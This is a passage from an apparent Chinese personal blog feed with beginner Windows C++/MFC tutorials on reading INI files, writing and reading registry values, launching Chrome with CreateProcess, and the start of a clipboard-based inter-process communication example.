class="string">&quot;%s\\Test.ini&quot;</span>, szPath);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> dwKey[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> dwKeyName[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> dwValue[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">GetPrivateProfileString</span>(<span class="string">&quot;man&quot;</span>, <span class="string">&quot;friend&quot;</span>, <span class="literal">NULL</span>, dwKey, <span class="number">1024</span>, szPathFile);</span><br><span class="line"><span class="built_in">GetPrivateProfileString</span>(<span class="string">&quot;man&quot;</span>, <span class="string">&quot;student&quot;</span>, <span class="literal">NULL</span>, dwKeyName, <span class="number">1024</span>, szPathFile);</span><br><span class="line"><span class="built_in">GetPrivateProfileString</span>(<span class="string">&quot;school&quot;</span>, <span class="string">&quot;teacher&quot;</span>, <span class="literal">NULL</span>, dwValue, <span class="number">1024</span>, szPathFile);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//cstring拼接</span></span><br><span class="line">CString strShow;</span><br><span class="line">strShow.<span class="built_in">Format</span>(<span class="string">&quot;friend:%s student:%s teacher:%s&quot;</span>, dwKey, dwKeyName, dwValue);</span><br><span class="line"><span class="built_in">MessageBox</span>(strShow);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但反正最后还是读出了值：</p><img src="/2022/07/23/windowsFiles/010.png" class=""><hr><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>注册表是存储在二进制文件里面的，win32api 提供了大量的函数操作注册表</p><p>额，默认打开的话，win+r是打开运行，然后输入regedit即可打开注册表，如果之前有用过就会很熟悉。</p><p><strong>动注册表之前，vs需要用管理员启动，不然肯定是无法写入的。</strong></p><p>项目还是之前那个没关系。</p><p><code>RegCreateKey</code>创建指定的注册表项</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegCreateKeyA</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PHKEY phkResult</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegCreateKeyW</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,     <span class="comment">//句柄，实际应该为分支</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpSubKey,  <span class="comment">//打开或创建的表项名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PHKEY phkResult   <span class="comment">//用来接收创建或打开的表项句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegCreateKey  RegCreateKeyW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegCreateKey  RegCreateKeyA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure><p>这个微软就喜欢多字节和Unicode，从他头文件中各自宏定义去兼容这两种编码。</p><p><code>RegOpenKey </code>打开注册表</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegOpenKeyA</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PHKEY phkResult</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegOpenKeyW</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PHKEY phkResult</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegOpenKey  RegOpenKeyW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegOpenKey  RegOpenKeyA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure><p><code>RegSetValue</code>写入注册表</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegSetValueA</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwType,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_opt_(cbData) LPCSTR lpData, <span class="comment">//存放的数据</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD cbData       <span class="comment">//要存放的值的大小长度</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegSetValueW</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwType,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_opt_(cbData) LPCWSTR lpData,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD cbData</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegSetValue  RegSetValueW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegSetValue  RegSetValueA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure><p><code>RegQueryValue</code>检索与指定注册表项的默认值或未命名值关联的数据。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegQueryValueA</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_writes_bytes_to_opt_(*lpcbData, *lpcbData) __out_data_source(REGISTRY) LPSTR lpData,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_opt_ PLONG lpcbData</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="function">WINADVAPI</span></span><br><span class="line"><span class="function">LSTATUS</span></span><br><span class="line"><span class="function">APIENTRY</span></span><br><span class="line"><span class="function"><span class="title">RegQueryValueW</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HKEY hKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpSubKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_writes_bytes_to_opt_(*lpcbData, *lpcbData) __out_data_source(REGISTRY) LPWSTR lpData,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_opt_ PLONG lpcbData</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegQueryValue  RegQueryValueW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RegQueryValue  RegQueryValueA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure><p>那么写入的部分其实还是有点水</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedWriteFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//注册表 写</span></span><br><span class="line">HKEY hKey;</span><br><span class="line">DWORD dwWeight = <span class="number">70</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建注册表</span></span><br><span class="line"><span class="comment">//DWORD dwRet = ::RegCreateKey(HKEY_LOCAL_MACHINE, &quot;SOFTWARE\\MYWEIGHT\\admin&quot;, &amp;hKey);</span></span><br><span class="line">DWORD dwRet = ::<span class="built_in">RegCreateKey</span>(HKEY_CURRENT_USER, <span class="string">&quot;Software\\HHH\\admin&quot;</span>, &amp;hKey);</span><br><span class="line">    <span class="keyword">if</span> (dwRet != ERROR_SUCCESS)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;创建注册表失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写注册表</span></span><br><span class="line">dwRet = ::<span class="built_in">RegSetValueEx</span>(hKey, <span class="string">&quot;weight&quot;</span>, <span class="literal">NULL</span>, REG_DWORD, (CONST BYTE *)dwWeight, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span> (dwRet != ERROR_SUCCESS)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;写入注册表失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭注册表</span></span><br><span class="line">::<span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后跑起来看看注册表里面有没有我们写入的。</p><img src="/2022/07/23/windowsFiles/011.png" class=""><p>md，<code>::RegCreateKey(HKEY_LOCAL_MACHINE, &quot;SOFTWARE\\MYWEIGHT\\admin&quot;, &amp;hKey);</code>这个注册表位置管理员打开的软件居然写不进去，我找了半天没找到，换了个地方写就马上见效，离谱，浪费我一堆时间啊。</p><p>然后读的部分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyCFileDlg::OnBnClickedReadFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//注册表 读</span></span><br><span class="line">HKEY hKey;</span><br><span class="line">DWORD dwRet = ::<span class="built_in">RegOpenKey</span>(HKEY_CURRENT_USER, <span class="string">&quot;Software\\HHH\\admin&quot;</span>, &amp;hKey);</span><br><span class="line"><span class="keyword">if</span> (dwRet != ERROR_SUCCESS)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;打开注册表失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读或者查注册表</span></span><br><span class="line">DWORD dwWight;</span><br><span class="line">DWORD dwType;</span><br><span class="line">DWORD dwSize;</span><br><span class="line">CString strShow;</span><br><span class="line">dwRet = ::<span class="built_in">RegQueryValueExA</span>(hKey, <span class="string">&quot;weight&quot;</span>, <span class="number">0</span>, &amp;dwType, (LPBYTE) &amp;dwWight, &amp;dwSize);</span><br><span class="line"><span class="keyword">if</span> (dwRet != ERROR_SUCCESS)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;读取注册表失败&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">strShow.<span class="built_in">Format</span>(<span class="string">&quot;Weight = %d&quot;</span>, dwWight);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭注册表</span></span><br><span class="line">::<span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line"><span class="built_in">MessageBox</span>(strShow);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实写起来也不难，就是要填充这个参数问题。</p><img src="/2022/07/23/windowsFiles/012.png" class=""><p>效果就是这样了。</p><hr><h2 id="常规的文件等级"><a href="#常规的文件等级" class="headerlink" title="常规的文件等级"></a>常规的文件等级</h2><ol><li>调试日志 debugview 文件日志、警告日志、错误日志 &#x2F;五星</li><li>视频存储 &#x2F;四星</li><li>文件传输CFile和Socket结合 &#x2F;四星</li><li>C语言和mfc的文件操作，win32api &#x2F;三星</li><li>windows的配置文件    &#x2F;五星</li><li>注册表 病毒 逆向     &#x2F;五星</li></ol><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>反正比较常用的文件操作还是以c语言和mfc为主吧，毕竟c用的很久了。mfc嘛自然在这个框架里面最好用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程</title>
      <link href="/2022/07/21/process/"/>
      <url>/2022/07/21/process/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。在早期面向进程设计的计算机结构中，进程是程序的基本执行实体；在当代面向线程设计的计算机结构中，进程是线程的容器。程序是指令、数据及其组织形式的描述，进程是程序的实体。<br>——百度百科</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>基本情况下，我们查看任务进程，包括kill一个未响应的进程，都会在任务管理器中操作。<br>不过微软自己有个进程资源管理器看到的会更详细一点，<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">链接戳此处</a></p><p><strong>注：需要科学上网，不然很慢</strong></p><img src="/2022/07/21/process/000.png" class=""><p>进程实际上就一个纯粹的容器，进程本身不执行任何东西。代码的实现靠的的是线程，进程只相当于一个环境。<br>子进程也还是一个进程，它是指由另一个进程(对应称为父进程)所创建的进程。<br>子进程的线程既可以在父进程终止之后执行代码，也可以在父进程运行过程中执行代码。</p><hr><h2 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h2><p><code>CreateProcess</code>用来创建进程的函数。<br>其原型，参数一贯的又臭又长</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateProcessW</span>(</span><br><span class="line">    _In_opt_ LPCWSTR lpApplicationName, <span class="comment">//该字符串可以指定要执行的模块的完整路径和文件名</span></span><br><span class="line">    _Inout_opt_ LPWSTR lpCommandLine,   <span class="comment">//命令行</span></span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">//该结构确定子进程是否可以继承返回到新进程对象的句柄，如果为NULL则不能继承</span></span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,  <span class="comment">//该结构确定子进程是否可以继承返回到新线程对象的句柄，如果为NULL则不能继承</span></span><br><span class="line">    _In_ BOOL bInheritHandles,  <span class="comment">//参数若为TRUE则新进程继承调用进程的每个可继承句柄。如为FALSE则不会继承句柄</span></span><br><span class="line">    _In_ DWORD dwCreationFlags, <span class="comment">//控制优先级别和流程创建的标识</span></span><br><span class="line">    _In_opt_ LPVOID lpEnvironment,  <span class="comment">//指向新进程的环境块的指针，若为NULL则新进程将使用调用进程的环境</span></span><br><span class="line">    _In_opt_ LPCWSTR lpCurrentDirectory,    <span class="comment">//进程当前目录的完整路径</span></span><br><span class="line">    _In_ LPSTARTUPINFOW lpStartupInfo,      <span class="comment">//设置扩展属性</span></span><br><span class="line">    _Out_ LPPROCESS_INFORMATION lpProcessInformation    <span class="comment">//该结构接收有关新进程的标识信息</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>具体可以去看文档。因为Windows API套娃严重。。他这里的参数还有结构体。有点绷不住。</p><p>然后自制进程的话不太理想，反正打开一个程序也是一个进程，就直接配置打开一个程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RunExe</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Chrome路径</span></span><br><span class="line">STARTUPINFO strStartup;</span><br><span class="line"><span class="built_in">memset</span>(&amp;strStartup, <span class="number">0</span>, <span class="built_in">sizeof</span>(strStartup));</span><br><span class="line">strStartup.cb = <span class="built_in">sizeof</span>(strStartup);</span><br><span class="line">PROCESS_INFORMATION szProcessInformation;</span><br><span class="line"><span class="built_in">memset</span>(&amp;szProcessInformation, <span class="number">0</span>, <span class="built_in">sizeof</span>(szProcessInformation));</span><br><span class="line"></span><br><span class="line">TCHAR szCommandLine[] = <span class="string">L&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ret = <span class="built_in">CreateProcess</span>(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">szCommandLine,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">FALSE,</span><br><span class="line">CREATE_NEW_CONSOLE,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">&amp;strStartup,</span><br><span class="line">&amp;szProcessInformation</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Create success ret = %d\n&quot;</span>, ret);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(szProcessInformation.hProcess,INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(szProcessInformation.hProcess);</span><br><span class="line"><span class="built_in">CloseHandle</span>(szProcessInformation.hThread);</span><br><span class="line"><span class="comment">//手动置空看情况。</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Create error!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//通过进程拉起谷歌浏览器</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This is Chrome\n&quot;</span>);</span><br><span class="line"><span class="built_in">RunExe</span>();</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>memset是计算机中C&#x2F;C++语言初始化函数。作用是将某一块内存中的内容全部设置为指定的值， 这个函数通常为新申请的内存做初始化工作。</strong></p><img src="/2022/07/21/process/001.png" class=""><p>可以看到是成功启动了我们的谷歌浏览器，但是自己用的时候要注意，文件路径每个人多少都有不同，所以不要直接套娃。</p><p>除了直接打开.exe，还可以通过命令行的方式让他打开网页<br><code>TCHAR szCommandLine[] = L&quot;\&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\&quot;https://www.baidu.com&quot;;</code><br>如此设置之后，run的时候就能看到浏览器直接打开百度的首页了。</p><img src="/2022/07/21/process/002.png" class=""><p>并且进程对象的成员也使得我们能够看到相对应的id</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ret)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Create success ret = %d\n&quot;</span>, ret);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(szProcessInformation.hProcess,INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;szProcessInformation.hProcess = %d\n&quot;</span>, szProcessInformation.hProcess);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;szProcessInformation.hThread = %d\n&quot;</span>, szProcessInformation.hThread);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;szProcessInformation.dwProcessId = %d\n&quot;</span>, szProcessInformation.dwProcessId);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;szProcessInformation.dwThreadId = %d\n&quot;</span>, szProcessInformation.dwThreadId);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(szProcessInformation.hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(szProcessInformation.hThread);</span><br><span class="line">    <span class="comment">//手动置空看情况。</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Create error!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/21/process/003.png" class=""><p>当然用这个调用cmd去执行一些命令好像有点问题，而且有点笨，它都可以直接通过system调用系统命令了。</p><hr><h2 id="进程间通信方式"><a href="#进程间通信方式" class="headerlink" title="进程间通信方式"></a>进程间通信方式</h2><ol><li>socket ip和端口</li><li>剪切板  剪切板的内核对象</li><li>邮槽 邮槽的内核对象</li><li>匿名管道(无名管道)</li><li>命名管道</li><li>Copy_data findwindows wm_copudata  Sendmessage</li></ol><hr><h2 id="剪切板"><a href="#剪切板" class="headerlink" title="剪切板"></a>剪切板</h2><p>新建项目mfc</p><img src="/2022/07/21/process/004.png" class=""><p>选择基于对话框，然后就点完成</p><img src="/2022/07/21/process/005.png" class=""><p>打开之后长这样就差不多了。</p><p>运行一下，跟里面看的差不多</p><img src="/2022/07/21/process/006.png" class=""><p>加下来要用到资源视图，如果没打开的可以参照</p><img src="/2022/07/21/process/007.png" class=""><img src="/2022/07/21/process/008.png" class=""><p>因为之前看过qt，所以拖动组件和修改id之类的不是什么问题。</p><img src="/2022/07/21/process/010.png" class=""><p>做成这样之后双击按钮进入代码实现部分,<strong>注意修改项目为多字节，unicode有点问题先不管了，但是可以提一嘴，就是接收的时候需要转换</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 